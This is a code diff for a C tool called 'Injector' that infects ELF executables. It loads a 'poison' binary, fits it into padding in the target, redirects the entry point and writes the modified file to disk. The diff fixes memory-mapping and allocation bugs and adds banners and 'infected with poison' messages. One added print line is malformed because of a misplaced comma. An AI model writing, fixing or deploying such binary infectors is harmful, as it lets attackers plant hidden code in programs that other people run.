@@ -1,4 +1,5 @@
 #include "elf.h"
+#include "consts.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/mman.h>
@@ -15,6 +16,7 @@ char targetFileError[50] = "Error on target binary file: ";
 char poisonFileError[50] = "Error on poison binary file: ";
 char munmapError[50] = "Error in writing target binary to disk: ";
 char readError[50] = "Error in reading poison to memory: ";
+
 
 // global vars
 unsigned long int target_binary_size;
@@ -41,12 +43,12 @@ void load_target_binary_in_memory(char *target_binary){
     struct stat buf;
     fstat(fd, &buf);
     target_binary_size = buf.st_size;
-    target_memory_address = mmap(0, target_binary_size, PROT_READ | PROT_WRITE, PROT_READ, fd, 0);
+    target_memory_address = mmap(0, target_binary_size, (PROT_READ | PROT_WRITE), MAP_SHARED, fd, 0);
     if (target_memory_address == MAP_FAILED){
         fatal_msg(strcat(mmapError, strerror(errno)));
     }
     close(fd);
-    fprintf(stdout, "[DEBUG] address of target binary: %p\n", target_memory_address); 
+    //fprintf(stdout, "[DEBUG] address of target binary: %p\n", target_memory_address); 
 }
 
 
@@ -60,7 +62,7 @@ void load_poison_binary_in_memory(char *poison_binary){
     struct stat buf;
     fstat(fd, &buf);
     poison_size = buf.st_size;
-    poison_address = (char*)malloc(sizeof(poison_size));
+    poison_address = (char*)malloc(poison_size);
     if (poison_address == NULL){
         fatal_msg(strcat(mallocError, strerror(errno)));
     }
@@ -69,7 +71,7 @@ void load_poison_binary_in_memory(char *poison_binary){
         fatal_msg(strcat(readError, strerror(errno)));
     }
     close(fd);
-    fprintf(stdout, "[DEBUG] address of poison binary: %p\n", poison_address); 
+    //fprintf(stdout, "[DEBUG] address of poison binary: %p\n", poison_address); 
 }
 
 
@@ -141,11 +143,22 @@ void inject_poison(char* injected_address){
     memcpy(target_memory_address + poison_offset, injected_address, poison_size);
 }
 
+
+void banner(){
+    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" AC_NORMAL);
+    fprintf(stdout, AC_GREEN "#\t\t\t\t\tInjector\t\t\t\t\t\t\t#\n" AC_NORMAL);
+    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n" AC_NORMAL);
+}
+
+
+
+
 int main(int argc, char *argv[]){
     if (argc != 3){
-        fprintf(stderr, "Usage: <%s> <target_binary> <poison_binary>\n", argv[0]);
+        fprintf(stderr, AC_RED "Usage: <%s> <target_binary> <poison_binary>\n" AC_NORMAL, argv[0]);
         exit(0);
     }
+    banner();
     char *target_binary = argv[1];
     char *poison_binary = argv[2];
     load_target_binary_in_memory(target_binary);
@@ -154,7 +167,7 @@ int main(int argc, char *argv[]){
     Elf64_Ehdr* target_binary_header = (Elf64_Ehdr*)target_memory_address;
     int pad_size = get_padding_size(target_binary_header);
     if (pad_size < poison_size){
-        fprintf(stdout, "%s\n", "no enough space for poison...");
+        fprintf(stdout, AC_RED, "[-] Not enough space for poison, binary '%s' was not infected...\n" AC_NORMAL, target_binary);
         exit(0);
     }
     // save original entry point
@@ -162,12 +175,13 @@ int main(int argc, char *argv[]){
 
     // change target binary entry point
     target_binary_header->e_entry = fake_entry_point;
-    
     patch_section_header(target_binary_header);
-    
     patch_poison(target_binary_header, original_entry_point);
-    
     inject_poison(injected_address);
 
+    free(injected_address);
+
+    fprintf(stdout, AC_MAGENTA "[+] Binary '%s' was infected with poison...\n" AC_NORMAL, target_binary);
     write_to_disk();
 }
+
